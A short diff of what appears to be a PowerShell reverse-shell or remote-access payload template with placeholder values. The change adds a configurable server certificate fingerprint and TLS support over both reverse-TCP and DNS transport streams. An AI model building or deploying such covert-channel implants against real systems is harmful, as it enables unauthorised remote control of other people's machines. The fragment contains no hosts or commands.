@@ -3,7 +3,7 @@
 if ($fp) {
     $servercertfp = $fp
 } else {
-    $servercertfp = $null
+    $servercertfp = "SYREPLACE_SERVERCERTFINGERPRINT"
 }
 
 $CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
@@ -28,7 +28,12 @@ if ($CHANNELENCRYPTION -eq "NONE") {
     Write-Output "Warning: CONNECTION UNENCRYPTED"
     $transport = $initialtransport
 } elseif ($CHANNELENCRYPTION -eq "TLS") {
-    $transport = Transport-Tls-Open $initialtransport.tcpStream $servercertfp
+    if ($CONNECTIONMETHOD -eq "REVERSETCP") {
+        $stream = $initialtransport.tcpStream
+    } elseif ($CONNECTIONMETHOD -eq "DNS") {
+        $stream = $initialtransport.stream
+    }
+    $transport = Transport-Tls-Open $stream $servercertfp
 } else {
     Write-Output "ERROR: wrapper method not defined"
     Exit(1)
